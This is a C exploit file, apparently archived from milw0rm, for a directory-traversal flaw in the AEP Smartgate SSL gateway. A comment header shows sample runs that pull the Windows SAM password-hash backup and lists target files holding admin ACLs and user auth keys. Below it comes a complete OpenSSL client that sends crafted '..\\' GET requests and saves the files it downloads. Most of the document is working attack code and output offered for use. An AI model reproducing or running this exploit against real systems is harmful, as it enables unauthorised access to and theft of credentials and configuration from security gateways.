/* prdelka-vs-AEP-smartgate
 * ========================
 * Smartgate is an application layer security gateway that meets FIPS 140-2
 * requirements for large-scale networked environments for IP-based Networks.
 * AEP provide network solutions for government, law enforcement, homeland security,
 * public safety, criminal intelligence and much more.
 * 
 * A vulnerability exists in the smartgate SSL server (listens on port 443 by default)
 * which may allow a malicious user to download arbitrary files with the priviledges
 * of the smartgate server. 
 *
 * By analyzing the returned HTTP header response, an attacker can also test for the 
 * existance of a remote directory. Remote directories return a "Moved Permanently" 
 * error, as opposed to a 404, as shown below.
 * 
 * localhost 0day # ./prdelka-vs-AEP-smartgate -s www.target.com -p 443 -f progra~1/v-one/smartgate/data -l sgusrdb.idx
 * [ AEP/Smartgate arbitrary file download exploit
 * [ Connected to www.target.com via (443/tcp)
 * [ Displaying raw HTTP response details
 * HTTP/1.0 301 Moved Permanently
 * Date: Tue Nov 22 16:53:11 GMT+00:00 2005
 * Location: /..\..\..\..\..\..\..\progra~1/v-one/smartgate/data/
 * Server: SSLSERVER/1.0
 * Content-Type: text/html
 * Expires: Now
 *
 * [ Exploit success, directory found
 *
 * A number of files/directories on win32 installations of smartgate may help the attacker further compromise
 * the VPN. Under unix installations the default root directory of smartgate is "/usr/smartgate" but may vary. 
 * 
 *  + progra~1/v-one/smartgate  - default directory for smartgate installation.
 *    + data                    - default directory for data files.
 *     - adm-gw.acl             - admin users are defined here.
 *     - reginfo.dat            - defines data entry fields for users.
 *     - sgate.acl              - access control for secured TCP services.
 *     - sgconf.ini             - dynamic information on the smartgate server including CA information.
 *     - sgusrdb.idx            - contains userid status,long name,group,auth key.
 *     - sweb.acl               - provides access control to webserver.
 *     - sweb.dny               - denies access to specified webservers.
 *  + winnt                     - common system root directory, varies.
 *   + repair                   - contains backup SAM file.
 *     - sam                    - backup of SAM file containing password hashes.
 *   + system32                 - common system32 directory, resides above %sysroot%
 *     - kernel32.dll           - detailed information of win32 version installed.
 *
 * Example.
 * Below is an example of exploit being used to retrieve the SAM password file in a real world attack. This
 * exploit is untested against unix implementations of smartgate but should function as expected with little
 * or no modification (char *http1). Tested against Smartgate V4.3B
 *
 * localhost 0day # gcc prdelka-vs-AEP-smartgate.c -o prdelka-vs-AEP-smartgate -lssl
 * localhost 0day # ./prdelka-vs-AEP-smartgate -s www.target.com -p 443 -f winnt/repair/sam. -l sam
 * [ AEP/Smartgate arbitrary file download exploit
 * [ Connected to www.target.com via (443/tcp)
 * [ Displaying raw HTTP response details
 * HTTP/1.0 200 OK
 * Date: Tue Nov 22 17:06:00 GMT+00:00 2005
 * Content-type: text/plain
 * Content-length: 20480
 * Server: SSLSERVER/1.0
 * Expires: Now
 *
 * [ Exploit success, file found
 * [ Recieved 20480 byte(s) and saved as 'sam'
 * 
 * - prdelka
 */
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>

int main(int argc,char *argv[])
{
    BIO * bio;
    SSL * ssl;
    SSL_CTX * ctx;
    int p,c,fd,index = 0;
    unsigned long size = 0;
    int ihost = 0, iport = 0, ifile = 0, ilocal = 0, check = 0;
    char *host,*request,*file,*connect,*port,*httpbuf,*httpbuf2;
    char *http1 = "GET /..\\..\\..\\..\\..\\..\\..\\";
    char *http2 = " HTTP/1.1\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A";
    char r[1024];
    static struct option options[]= {
	    {"server", 1, 0, 's'},
	    {"port", 1 , 0, 'p'},
	    {"remotefile", 1, 0, 'f'},
	    {"localfile", 1, 0, 'l'},
	    {"help", 0, 0, 'h'}
    };
    printf("[ AEP/Smartgate arbitrary file download exploit\n");
    while(c != -1)
    {
	    c = getopt_long(argc,argv,"s:p:f:l:h",options,&index);
	    switch(c){
		case -1:
			    break;
		case 's':
			    host = malloc(strlen(optarg) + 1);
			    sprintf(host,"%s",optarg);
			    ihost = 1;
			    break;
		case 'p':
			    port = malloc(strlen(optarg) + 1);
			    sprintf(port,"%s",optarg);
			    iport = 1;
			    break;
		case 'f':
			    request = malloc(strlen(optarg) + strlen(http1) + strlen(http2) + 1);
			    sprintf(request,"%s%s%s",http1,optarg,http2);
			    ifile = 1;
			    break;
		case 'l':
			    file = malloc(strlen(optarg) + 1);
			    sprintf(file,"%s",optarg);
			    ilocal = 1;
			    break;
		case 'h':
			    printf("[\n[ %s\n",argv[0]);
			    printf("[   --server|-s <dns/ip>\n");
			    printf("[   --port|-p <port>\n");
			    printf("[   --remotefile|-f <path/and/file>\n");
			    printf("[   --localfile|-l <localfile/to/saveas>\n");
			    printf("[\n[ For a more detailed explanation read the source\n");
			    exit(0);
			    break;
		default:
			    break;
			    
	    }
    }
    if(ihost != 1 || iport != 1 || ifile != 1 || ilocal != 1){
	    printf("[ Try %s --help\n",argv[0]);
	    exit(0);
    }
    ERR_load_BIO_strings();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(SSLv23_client_method());
    bio = BIO_new_ssl_connect(ctx);
    BIO_get_ssl(bio, & ssl);
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    connect = malloc(strlen(host) + strlen(port) + 2);
    sprintf(connect,"%s:%s",host,port);
    BIO_set_conn_hostname(bio, connect);
    if(BIO_do_connect(bio) <= 0)
    {
        fprintf(stderr, "[ Error attempting to connect\n");
        ERR_print_errors_fp(stderr);
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return 0;
    }
    printf("[ Connected to %s via (%s/tcp)\n",host,port);
    BIO_write(bio, request, strlen(request));
    check = 0;
    httpbuf = malloc(2);
    memset(httpbuf,0,2);
    while(check == 0)
    {
    	p = BIO_read(bio, r, 1);
    	r[p] = 0;
	httpbuf2 = malloc(strlen(r) + strlen(httpbuf) + 1);
    	sprintf(httpbuf2,"%s%s",httpbuf,r);
	free(httpbuf);
	httpbuf = httpbuf2;
	check = (int)strstr(httpbuf,"\n\n");
    }
    printf("[ Displaying raw HTTP response details\n");
    printf("%s",httpbuf);
    check = 0;
    check = (int)strstr(httpbuf,"200 OK");
    if(check != 0)
    {
	printf("[ Exploit success, file found\n");
    	fd = open(file,O_RDWR|O_CREAT,S_IRWXU);
    	if(fd == -1){
		    printf("[ Error creating %s",file);
		    exit(0);
    	}
    	for(;;)
    	{
       		p = BIO_read(bio, r, 1023);
        	if(p <= 0) break;
       	        r[p] = 0;
		write(fd,r,p);
		size = size + p;
    	}
	printf("[ Recieved %u byte(s) and saved as '%s'\n",size,file);
	close(fd);
    }
    if(check==0)
    {
    	check = (int)strstr(httpbuf,"301 Moved");
   	 if(check != 0)
    	{
		    printf("[ Exploit success, directory found\n");
    	}
    }
    free(httpbuf);
    if(check == 0)
    {
	    printf("[ Exploit failed\n");
    }
    BIO_free_all(bio);
    SSL_CTX_free(ctx);
    return 0;
}

// milw0rm.com [2006-10-24]
